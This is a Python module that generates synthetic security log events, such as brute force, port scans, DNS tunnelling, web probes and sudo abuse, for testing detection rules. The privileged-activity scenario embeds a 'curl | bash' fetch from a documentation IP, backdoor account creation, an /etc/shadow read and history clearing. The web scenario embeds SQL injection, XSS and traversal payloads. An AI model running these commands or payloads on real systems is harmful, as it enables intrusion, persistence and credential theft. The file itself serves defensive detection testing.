"""Synthetic security event scenarios.

Safety guarantees:
* All external IP addresses belong to RFC 5737 documentation blocks
  (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`).
* All internal IP addresses belong to RFC 1918 private blocks (`10.0.0.0/8`).
* All domain names use RFC 2606 reserved suffixes (`.test`, `.example`).
* Every generated event has `is_synthetic=True` and `labels.synthetic=True`.
* No network traffic, sockets or external requests are ever performed.
"""

from __future__ import annotations

import random
from collections.abc import Callable
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta

from app.domain.enums import EventOutcome, EventType, Severity
from app.domain.events import NormalizedEvent


@dataclass(frozen=True, slots=True)
class ScenarioDefinition:
    id: str
    name: str
    category: str
    description: str
    expected_rules: tuple[str, ...]
    mitre_techniques: tuple[str, ...]
    default_seed: int
    build_events: Callable[[random.Random, datetime], list[NormalizedEvent]]


def _syslog_ts(dt: datetime) -> str:
    return dt.astimezone(UTC).strftime("%b %d %H:%M:%S")


def _clf_ts(dt: datetime) -> str:
    return dt.astimezone(UTC).strftime("%d/%b/%Y:%H:%M:%S +0000")


def _make_ssh_event(
    ts: datetime,
    *,
    src_ip: str,
    src_port: int,
    user: str,
    host: str,
    success: bool,
    method: str = "password",
    invalid_user: bool = False,
    pid: int = 2410,
) -> NormalizedEvent:
    verb = "Accepted" if success else "Failed"
    inv = "invalid user " if (invalid_user and not success) else ""
    raw = (
        f"{_syslog_ts(ts)} {host} sshd[{pid}]: {verb} {method} for "
        f"{inv}{user} from {src_ip} port {src_port} ssh2"
    )
    return NormalizedEvent(
        timestamp=ts,
        event_type=EventType.AUTHENTICATION,
        event_action="ssh_login",
        event_outcome=EventOutcome.SUCCESS if success else EventOutcome.FAILURE,
        severity=Severity.INFORMATIONAL if success else Severity.LOW,
        log_source="linux_auth",
        raw_event=raw,
        source_ip=src_ip,
        source_port=src_port,
        destination_port=22,
        protocol="ssh",
        username=user,
        hostname=host,
        service="sshd",
        fields={"auth.method": method, "user.invalid": invalid_user, "process.pid": pid},
        is_synthetic=True,
    )


def _make_sudo_event(
    ts: datetime,
    *,
    user: str,
    target_user: str,
    command: str,
    host: str,
    success: bool = True,
    reason: str = "",
    working_dir: str = "/home/user",
) -> NormalizedEvent:
    reason_segment = f"{reason} ; " if not success and reason else ""
    raw = (
        f"{_syslog_ts(ts)} {host} sudo: {user} : {reason_segment}"
        f"TTY=pts/0 ; PWD={working_dir} ; USER={target_user} ; COMMAND={command}"
    )
    return NormalizedEvent(
        timestamp=ts,
        event_type=EventType.PROCESS_EXECUTION,
        event_action="sudo",
        event_outcome=EventOutcome.SUCCESS if success else EventOutcome.FAILURE,
        severity=Severity.LOW if success else Severity.MEDIUM,
        log_source="linux_auth",
        raw_event=raw,
        username=user,
        hostname=host,
        service="sudo",
        fields={
            "process.command_line": command,
            "process.working_directory": working_dir,
            "user.target.name": target_user,
            "process.tty": "pts/0",
            **({"event.reason": reason} if reason else {}),
        },
        is_synthetic=True,
    )


def _make_fw_event(
    ts: datetime,
    *,
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    proto: str = "tcp",
    allow: bool = False,
    host: str = "fw-edge-01",
    seq_tag: int = 1,
) -> NormalizedEvent:
    verb = "ALLOW" if allow else "BLOCK"
    raw = (
        f"{_syslog_ts(ts)} {host} kernel: [{1000 + seq_tag}.10] [UFW {verb}] "
        f"IN=eth0 OUT= SRC={src_ip} DST={dst_ip} LEN=60 PROTO={proto.upper()} "
        f"SPT={src_port} DPT={dst_port} WINDOW=64240 SYN"
    )
    return NormalizedEvent(
        timestamp=ts,
        event_type=EventType.FIREWALL,
        event_action="firewall_allow" if allow else "firewall_block",
        event_outcome=EventOutcome.SUCCESS if allow else EventOutcome.FAILURE,
        severity=Severity.INFORMATIONAL if allow else Severity.LOW,
        log_source="iptables",
        raw_event=raw,
        source_ip=src_ip,
        destination_ip=dst_ip,
        source_port=src_port,
        destination_port=dst_port,
        protocol=proto.lower(),
        hostname=host,
        service="firewall",
        fields={
            "firewall.rule_action": verb.lower(),
            "network.interface.in": "eth0",
            "network.tcp.flags": ["SYN"],
        },
        is_synthetic=True,
    )


def _make_dns_event(
    ts: datetime,
    *,
    src_ip: str,
    src_port: int,
    qname: str,
    qtype: str = "A",
    resolver_ip: str = "10.0.1.2",
    host: str = "ns-int-01",
) -> NormalizedEvent:
    raw = (
        f"{_syslog_ts(ts)} {host} named[912]: client @0x7f10 {src_ip}#{src_port} "
        f"({qname}): query: {qname} IN {qtype} + ({resolver_ip})"
    )
    return NormalizedEvent(
        timestamp=ts,
        event_type=EventType.DNS_QUERY,
        event_action="dns_query",
        event_outcome=EventOutcome.SUCCESS,
        severity=Severity.INFORMATIONAL,
        log_source="bind_query",
        raw_event=raw,
        source_ip=src_ip,
        source_port=src_port,
        destination_ip=resolver_ip,
        destination_port=53,
        protocol="udp",
        hostname=host,
        service="named",
        fields={
            "dns.question.name": qname,
            "dns.question.type": qtype,
            "dns.question.class": "IN",
            "dns.question.length": len(qname),
        },
        is_synthetic=True,
    )


def _make_http_event(
    ts: datetime,
    *,
    src_ip: str,
    method: str,
    target: str,
    status: int,
    ua: str,
    body_bytes: int = 512,
    user: str | None = None,
    host: str = "web-prod-01",
) -> NormalizedEvent:
    path, _, query = target.partition("?")
    user_field = user or "-"
    raw = (
        f'{src_ip} - {user_field} [{_clf_ts(ts)}] "{method} {target} HTTP/1.1" '
        f'{status} {body_bytes} "-" "{ua}"'
    )
    fields: dict[str, str | int | float | bool | list[str] | list[int] | None] = {
        "http.request.method": method,
        "http.version": "HTTP/1.1",
        "http.response.status_code": status,
        "http.response.body.bytes": body_bytes,
        "url.original": target,
        "url.path": path or "/",
        "user_agent.original": ua,
    }
    if query:
        fields["url.query"] = query
    return NormalizedEvent(
        timestamp=ts,
        event_type=EventType.HTTP_REQUEST,
        event_action="http_request",
        event_outcome=EventOutcome.SUCCESS if status < 400 else EventOutcome.FAILURE,
        severity=Severity.LOW if status >= 400 else Severity.INFORMATIONAL,
        log_source="web_access",
        raw_event=raw,
        source_ip=src_ip,
        protocol="http",
        username=user,
        hostname=host,
        service="http",
        fields=fields,
        is_synthetic=True,
    )


# ---------------------------------------------------------------------------
# Scenario builders
# ---------------------------------------------------------------------------


def _build_normal_activity(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    """Realistic benign baseline traffic that must trigger ZERO detection rules."""
    base = now - timedelta(minutes=25)
    events: list[NormalizedEvent] = []

    # 1. Normal SSH logins by staff + one isolated password typo followed by success
    staff = [("alice", "10.0.2.11"), ("bob", "10.0.2.12"), ("carol", "10.0.2.13")]
    for idx, (user, ip) in enumerate(staff):
        events.append(
            _make_ssh_event(
                base + timedelta(minutes=idx * 3),
                src_ip=ip,
                src_port=rng.randint(40000, 60000),
                user=user,
                host="bastion-01",
                success=True,
                method="publickey",
                pid=3000 + idx,
            )
        )
    # Single mistyped password by bob, then immediate success (well below threshold=5/10)
    events.append(
        _make_ssh_event(
            base + timedelta(minutes=10),
            src_ip="10.0.2.12",
            src_port=51200,
            user="bob",
            host="app-srv-01",
            success=False,
            pid=3101,
        )
    )
    events.append(
        _make_ssh_event(
            base + timedelta(minutes=10, seconds=6),
            src_ip="10.0.2.12",
            src_port=51201,
            user="bob",
            host="app-srv-01",
            success=True,
            pid=3102,
        )
    )

    # 2. Authorised admin sudo activity (safe maintenance commands)
    events.append(
        _make_sudo_event(
            base + timedelta(minutes=12),
            user="admin",
            target_user="root",
            command="/usr/bin/systemctl status nginx",
            host="web-prod-01",
            working_dir="/home/admin",
        )
    )
    events.append(
        _make_sudo_event(
            base + timedelta(minutes=13),
            user="ops",
            target_user="root",
            command="/usr/bin/journalctl -u postgresql -n 50",
            host="db-prod-01",
            working_dir="/home/ops",
        )
    )

    # 3. Normal web requests (browsers, normal paths, 200/304 responses)
    normal_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    paths = ["/", "/dashboard", "/static/app.js", "/static/logo.svg", "/api/status", "/profile"]
    for idx, path in enumerate(paths):
        events.append(
            _make_http_event(
                base + timedelta(minutes=14, seconds=idx * 10),
                src_ip=f"10.0.2.{20 + (idx % 3)}",
                method="GET",
                target=path,
                status=200,
                ua=normal_ua,
                body_bytes=1200 + idx * 150,
            )
        )

    # 4. Normal DNS lookups for short, low-entropy internal & cloud domains
    domains = [
        "intranet.corp.example",
        "mail.corp.example",
        "git.corp.example",
        "docs.corp.example",
        "s3.amazonaws.com",
        "login.microsoft.com",
    ]
    for idx, dom in enumerate(domains):
        events.append(
            _make_dns_event(
                base + timedelta(minutes=16, seconds=idx * 8),
                src_ip="10.0.2.11",
                src_port=52000 + idx,
                qname=dom,
                qtype="A",
            )
        )

    # 5. A few allowed firewall connections to standard ports (443, 22, 5432)
    for idx, port in enumerate((443, 22, 5432)):
        events.append(
            _make_fw_event(
                base + timedelta(minutes=18, seconds=idx * 5),
                src_ip="10.0.2.11",
                dst_ip="10.0.1.10",
                src_port=53000 + idx,
                dst_port=port,
                allow=True,
                seq_tag=idx,
            )
        )

    return events


def _build_ssh_brute_force(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=6)
    attacker_ip = "203.0.113.45"
    users = ["root", "admin", "deploy", "ubuntu", "postgres", "backup"]
    events: list[NormalizedEvent] = []

    for i in range(24):
        target_user = users[i % len(users)]
        events.append(
            _make_ssh_event(
                base + timedelta(seconds=i * 4),
                src_ip=attacker_ip,
                src_port=rng.randint(35000, 62000),
                user=target_user,
                host="bastion-01",
                success=False,
                invalid_user=target_user in ("ubuntu", "backup"),
                pid=4100 + i,
            )
        )

    # Final attempt succeeds on `deploy` -> escalates rule to CRITICAL
    events.append(
        _make_ssh_event(
            base + timedelta(seconds=25 * 4),
            src_ip=attacker_ip,
            src_port=rng.randint(35000, 62000),
            user="deploy",
            host="bastion-01",
            success=True,
            pid=4200,
        )
    )
    return events


def _build_password_spraying(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=15)
    attacker_ip = "198.51.100.77"
    accounts = [
        "agarcia",
        "bchen",
        "ckumar",
        "dnovak",
        "epetrov",
        "fmoreau",
        "gschmidt",
        "htanaka",
        "irossi",
        "jsmith",
    ]
    events: list[NormalizedEvent] = []
    for idx, account in enumerate(accounts):
        events.append(
            _make_ssh_event(
                base + timedelta(seconds=idx * 25),
                src_ip=attacker_ip,
                src_port=rng.randint(40000, 60000),
                user=account,
                host="vpn-gw-01",
                success=False,
                pid=5100 + idx,
            )
        )
    return events


def _build_port_scan(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=4)
    scanner_ip = "192.0.2.99"
    target_ip = "10.0.1.10"
    ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        111,
        135,
        139,
        143,
        389,
        443,
        445,
        465,
        587,
        636,
        993,
        995,
        1433,
        1521,
        2049,
        2375,
        3306,
        3389,
        5432,
        5900,
        6379,
        8000,
        8080,
        8443,
        9000,
        9200,
        27017,
    ]
    events: list[NormalizedEvent] = []
    for idx, port in enumerate(ports):
        events.append(
            _make_fw_event(
                base + timedelta(milliseconds=idx * 600),
                src_ip=scanner_ip,
                dst_ip=target_ip,
                src_port=rng.randint(45000, 65000),
                dst_port=port,
                allow=port in (22, 80, 443),
                seq_tag=idx,
            )
        )
    return events


def _build_suspicious_dns(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=5)
    infected_host = "10.0.2.44"
    alphabet = "abcdefghijklmnopqrstuvwxyz23456789"
    events: list[NormalizedEvent] = []
    for i in range(12):
        # High-entropy 38-char payload label + tunnel parent domain
        chunk = "".join(rng.choice(alphabet) for _ in range(38))
        qname = f"{chunk}.s{i:02d}.c2-tunnel.example.test"
        events.append(
            _make_dns_event(
                base + timedelta(seconds=i * 3),
                src_ip=infected_host,
                src_port=54000 + i,
                qname=qname,
                qtype="TXT",
            )
        )
    return events


def _build_suspicious_http(_rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=4)
    attacker_ip = "203.0.113.112"
    probes = [
        ("GET", "/.env", 404, "Mozilla/5.0 (compatible; Nuclei)"),
        ("GET", "/.git/config", 403, "Mozilla/5.0 (compatible; Nuclei)"),
        ("GET", "/ wp-config.php".replace(" ", ""), 404, "Nikto/2.5.0"),
        (
            "GET",
            "/download?file=%252e%252e%252f%252e%252e%252fetc/passwd",
            200,
            "sqlmap/1.8.2#stable (https://sqlmap.org)",
        ),
        (
            "GET",
            "/api/items?id=1'%20UNION%20SELECT%20username,password_hash%20FROM%20users--",
            500,
            "sqlmap/1.8.2#stable (https://sqlmap.org)",
        ),
        (
            "GET",
            "/search?q=<script>alert(1)</script>",
            400,
            "Mozilla/5.0",
        ),
    ]
    events: list[NormalizedEvent] = []
    for idx, (method, target, status, ua) in enumerate(probes):
        events.append(
            _make_http_event(
                base + timedelta(seconds=idx * 4),
                src_ip=attacker_ip,
                method=method,
                target=target,
                status=status,
                ua=ua,
            )
        )
    return events


def _build_privileged_activity(_rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    base = now - timedelta(minutes=8)
    host = "app-srv-02"
    events: list[NormalizedEvent] = [
        _make_sudo_event(
            base,
            user="intern01",
            target_user="root",
            command="/bin/cat /etc/shadow",
            host=host,
            success=False,
            reason="user NOT in sudoers",
            working_dir="/home/intern01",
        ),
        _make_sudo_event(
            base + timedelta(seconds=12),
            user="intern01",
            target_user="root",
            command="/usr/sbin/useradd -m -G sudo backdoor_svc",
            host=host,
            success=True,
            working_dir="/home/intern01",
        ),
        _make_sudo_event(
            base + timedelta(seconds=24),
            user="intern01",
            target_user="root",
            command="/bin/sh -c 'curl -fsSL http://198.51.100.88/stage2.sh | bash'",
            host=host,
            success=True,
            working_dir="/tmp",  # noqa: S108 - synthetic log attribute, not a local file
        ),
        _make_sudo_event(
            base + timedelta(seconds=35),
            user="intern01",
            target_user="root",
            command="history -c && unset HISTFILE",
            host=host,
            success=True,
            working_dir="/tmp",  # noqa: S108 - synthetic log attribute, not a local file
        ),
    ]
    return events


def _build_multi_stage_attack(rng: random.Random, now: datetime) -> list[NormalizedEvent]:
    """Coordinated intrusion: Recon scan -> SSH brute force -> privilege escalation -> DNS exfil."""
    base = now - timedelta(minutes=12)
    attacker_ip = "203.0.113.200"
    victim_ip = "10.0.1.20"
    victim_host = "app-srv-01"
    events: list[NormalizedEvent] = []

    # Stage 1: Port scan from 203.0.113.200 against 10.0.1.20
    scan_ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        139,
        443,
        445,
        1433,
        3306,
        3389,
        5432,
        6379,
        8000,
        8080,
        8443,
        9000,
        9200,
        27017,
        27018,
    ]
    for idx, port in enumerate(scan_ports):
        events.append(
            _make_fw_event(
                base + timedelta(seconds=idx),
                src_ip=attacker_ip,
                dst_ip=victim_ip,
                src_port=rng.randint(40000, 60000),
                dst_port=port,
                allow=port in (22, 443),
                host="fw-edge-01",
                seq_tag=idx,
            )
        )

    # Stage 2: SSH brute force against webadmin on app-srv-01, ending with success
    stage2 = base + timedelta(minutes=2)
    for i in range(12):
        events.append(
            _make_ssh_event(
                stage2 + timedelta(seconds=i * 3),
                src_ip=attacker_ip,
                src_port=51000 + i,
                user="webadmin",
                host=victim_host,
                success=False,
                pid=6100 + i,
            )
        )
    events.append(
        _make_ssh_event(
            stage2 + timedelta(seconds=40),
            src_ip=attacker_ip,
            src_port=51050,
            user="webadmin",
            host=victim_host,
            success=True,
            pid=6200,
        )
    )

    # Stage 3: Privilege escalation on app-srv-01 by webadmin
    stage3 = base + timedelta(minutes=4)
    events.append(
        _make_sudo_event(
            stage3,
            user="webadmin",
            target_user="root",
            command="/bin/cat /etc/shadow",
            host=victim_host,
            success=True,
            working_dir="/var/www",
        )
    )
    events.append(
        _make_sudo_event(
            stage3 + timedelta(seconds=15),
            user="webadmin",
            target_user="root",
            command="history -c",
            host=victim_host,
            success=True,
            working_dir="/var/www",
        )
    )

    # Stage 4: DNS exfiltration from 10.0.1.20 to *.exfil.example.test
    stage4 = base + timedelta(minutes=5)
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(8):
        label = "".join(rng.choice(alphabet) for _ in range(36))
        events.append(
            _make_dns_event(
                stage4 + timedelta(seconds=i * 2),
                src_ip=victim_ip,
                src_port=56000 + i,
                qname=f"{label}.chunk{i}.exfil.example.test",
                qtype="TXT",
            )
        )

    return events


SCENARIOS: tuple[ScenarioDefinition, ...] = (
    ScenarioDefinition(
        id="normal_activity",
        name="Normal Baseline Activity (Benign)",
        category="benign",
        description=(
            "Generates realistic day-to-day enterprise logs: SSH key logins, a single "
            "mistyped password followed by success, authorised admin sudo checks, normal "
            "web browsing and standard DNS lookups. Verifies that benign traffic does "
            "not trigger false-positive alerts."
        ),
        expected_rules=(),
        mitre_techniques=(),
        default_seed=1001,
        build_events=_build_normal_activity,
    ),
    ScenarioDefinition(
        id="ssh_brute_force",
        name="SSH Brute Force & Compromise",
        category="credential_access",
        description=(
            "Simulates 24 rapid failed SSH password guesses from 203.0.113.45 against "
            "bastion-01 across multiple accounts, followed by a successful login to "
            "`deploy` (escalating alert severity to Critical)."
        ),
        expected_rules=("SENT-AUTH-001", "SENT-AUTH-002"),
        mitre_techniques=("T1110.001", "T1021.004"),
        default_seed=2001,
        build_events=_build_ssh_brute_force,
    ),
    ScenarioDefinition(
        id="password_spraying",
        name="Low-and-Slow Password Spraying",
        category="credential_access",
        description=(
            "Simulates a single external IP (198.51.100.77) attempting one password "
            "against 10 distinct corporate usernames to stay below per-account lockout "
            "thresholds."
        ),
        expected_rules=("SENT-AUTH-002",),
        mitre_techniques=("T1110.003",),
        default_seed=2002,
        build_events=_build_password_spraying,
    ),
    ScenarioDefinition(
        id="port_scan",
        name="Vertical TCP Port Scan",
        category="discovery",
        description=(
            "Simulates external host 192.0.2.99 scanning 34 service ports on internal "
            "server 10.0.1.10 within 25 seconds."
        ),
        expected_rules=("SENT-NET-001",),
        mitre_techniques=("T1046", "T1595.001"),
        default_seed=2003,
        build_events=_build_port_scan,
    ),
    ScenarioDefinition(
        id="suspicious_dns",
        name="DNS Tunneling / High-Entropy Queries",
        category="command_and_control",
        description=(
            "Simulates internal workstation 10.0.2.44 issuing high-entropy TXT subdomain "
            "queries to `*.c2-tunnel.example.test` indicative of DNS tunneling."
        ),
        expected_rules=("SENT-DNS-001",),
        mitre_techniques=("T1071.004", "T1048"),
        default_seed=2004,
        build_events=_build_suspicious_dns,
    ),
    ScenarioDefinition(
        id="suspicious_http",
        name="Web Vulnerability Scan & Path Traversal",
        category="initial_access",
        description=(
            "Simulates HTTP probes from 203.0.113.112 for `.env`, `.git/config`, "
            "SQL injection, XSS, and a double URL-encoded `/etc/passwd` traversal that "
            "returns HTTP 200."
        ),
        expected_rules=("SENT-WEB-001",),
        mitre_techniques=("T1190", "T1595.002"),
        default_seed=2005,
        build_events=_build_suspicious_http,
    ),
    ScenarioDefinition(
        id="privileged_activity",
        name="Unauthorised Sudo & Persistence Commands",
        category="privilege_escalation",
        description=(
            "Simulates unauthorized user `intern01` attempting to read `/etc/shadow`, "
            "creating a privileged local account, piping `curl` to `bash`, and clearing "
            "shell command history."
        ),
        expected_rules=("SENT-PRIV-001",),
        mitre_techniques=("T1548.003", "T1136.001", "T1070.003", "T1105"),
        default_seed=2006,
        build_events=_build_privileged_activity,
    ),
    ScenarioDefinition(
        id="multi_stage_attack",
        name="Multi-Stage Intrusion (Recon -> Brute Force -> Privesc -> Exfil)",
        category="multi_stage",
        description=(
            "End-to-end synthetic intrusion chain: port scan from 203.0.113.200 -> SSH "
            "brute force ending in compromise of `webadmin` -> unauthorized `/etc/shadow` "
            "read and history clearing -> DNS tunneling exfiltration from the compromised host."
        ),
        expected_rules=(
            "SENT-NET-001",
            "SENT-AUTH-001",
            "SENT-AUTH-003",
            "SENT-PRIV-001",
            "SENT-DNS-001",
        ),
        mitre_techniques=("T1046", "T1110.001", "T1548.003", "T1070.003", "T1071.004"),
        default_seed=2007,
        build_events=_build_multi_stage_attack,
    ),
)

SCENARIOS_BY_ID: dict[str, ScenarioDefinition] = {s.id: s for s in SCENARIOS}


def generate_scenario_events(
    scenario_id: str,
    *,
    seed: int | None = None,
    reference_time: datetime | None = None,
) -> tuple[ScenarioDefinition, int, list[NormalizedEvent]]:
    scenario = SCENARIOS_BY_ID.get(scenario_id)
    if scenario is None:
        raise KeyError(f"Unknown simulation scenario: {scenario_id!r}")
    chosen_seed = seed if seed is not None else scenario.default_seed
    rng = random.Random(chosen_seed)  # noqa: S311 - deterministic simulation RNG, not crypto
    now = reference_time or datetime.now(UTC)
    events = scenario.build_events(rng, now)
    return scenario, chosen_seed, events
